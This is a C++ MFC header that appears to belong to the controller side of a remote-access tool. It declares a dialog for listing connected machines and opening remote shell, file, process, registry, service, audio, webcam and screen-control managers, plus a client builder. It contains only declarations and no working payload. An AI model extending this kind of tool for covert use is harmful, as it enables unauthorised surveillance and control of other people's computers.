
// ServerDlg.h : 头文件
//

#pragma once
#include "afxcmn.h"

#include "TrueColorToolBar.h"
#include "IOCPServer.h"


// CServerDlg 对话框
class CServerDlg : public CDialogEx
{
// 构造
public:
	CServerDlg(CWnd* pParent = NULL);	// 标准构造函数

	void DoDataExchange(CDataExchange * pDX);


// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SERVER_DIALOG };
#endif
	protected:
	//virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持
// 实现
protected:
	HICON m_hIcon;
	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnIconNotify(WPARAM wParam, LPARAM lParam);
	
	DECLARE_MESSAGE_MAP()


	//初始化ControlList控件
	VOID CServerDlg::InitListControl();
	VOID CServerDlg::InitSolidMenu();
	VOID CServerDlg::InitNotifyIconData();
	VOID CServerDlg::InitStatusBar();
	VOID CServerDlg::InitTrueToolBarMain();
	VOID Activate(int Port, int MaxConnections);                     //创建通信引擎
	VOID WindowShowMessage(BOOL IsOk, CString Message);              //窗口显示数据
private:
	CBitmap m_Bitmap[30];
	NOTIFYICONDATA      m_NotifyIconData;
	CListCtrl           m_CListCtrl_Server_Online;
	CListCtrl           m_CListCtrl_Server_Message;
	CStatusBar          m_StatusBar;
	CTrueColorToolBar   m_CTrueColorToolBar_Server_Main;
	int                 m_Count;
public:
	static VOID CALLBACK WindowNotifyProcedure(PCONTEXT_OBJECT ContextObject);
	static VOID CServerDlg::MessageHandleIO(CONTEXT_OBJECT* ContextObject);


	afx_msg void OnServerMainSet();
	afx_msg void OnServerMainExit();
	afx_msg void OnClose();
	afx_msg void OnNotifyicondataExit();
	afx_msg void OnNotifyicondataShow();
	afx_msg void OnSize(UINT nType, int cx, int cy);


	VOID CServerDlg::SendingSelectedCommand(PBYTE BufferData, ULONG BufferLength);

	//测试代码
	afx_msg void OnServermainTestAddUser();
	
	
	
	//用户上线
	afx_msg LRESULT OnClientLogin(WPARAM wParam, LPARAM lParam);
	VOID CServerDlg::AddCtrlListServerOnline(CString ClientAddressData, CString ClientPosition, CString HostNameData,
		CString OSNameData, CString ProcessorNameStringData, CString IsWebCameraExist, CString WebSpeed, CONTEXT_OBJECT* ContextObject);


	//即时消息
	afx_msg LRESULT OpenInstantMessageDialog(WPARAM wParam, LPARAM lParam);

	//终端管理
	afx_msg void OnServerCmdManager();
    afx_msg LRESULT OnOpenCmdManagerDialog(WPARAM wParam, LPARAM lParam);


	//进程管理
	afx_msg void OnServerProcessManager();
	afx_msg LRESULT OnOpenProcessManagerDialog(WPARAM wParam, LPARAM lParam);


	//窗口管理
	afx_msg void OnServerWindowManager();
	afx_msg LRESULT OnOpenWindowManagerDialog(WPARAM wParam, LPARAM lParam);

	//远程控制
	afx_msg void OnServerRemoteControll();
    afx_msg LRESULT OnOpenRemoteControllDialog(WPARAM wParam, LPARAM lParam);
	
	//文件管理
	afx_msg void OnServerFileManager();
	afx_msg LRESULT OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam);

	//音频管理
	afx_msg void  OnServerAudioManager();
	afx_msg LRESULT OnOpenAudioManagerDialog(WPARAM wParam, LPARAM lParam);

	//视频管理
	afx_msg void  OnServerVideoManager();
	afx_msg LRESULT OnOpenVideoManagerDialog(WPARAM wParam, LPARAM lParam);
	//服务管理
	afx_msg void  OnServerServiceManager();
	afx_msg LRESULT OnOpenServiceManagerDialog(WPARAM wParam, LPARAM lParam);

	//注册表管理
	afx_msg void OnServerRegisterManager();
	afx_msg LRESULT OnOpenRegisterManagerDialog(WPARAM wParam, LPARAM lParam);
	
	//生成客户端
	afx_msg void OnServerCreateClient();
	afx_msg void OnNMRClickListServerOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnListserveronlinemainDelete();
	afx_msg void OnListserveronlinemainMessage();
	afx_msg void OnListserveronlinemainShutdown();
};
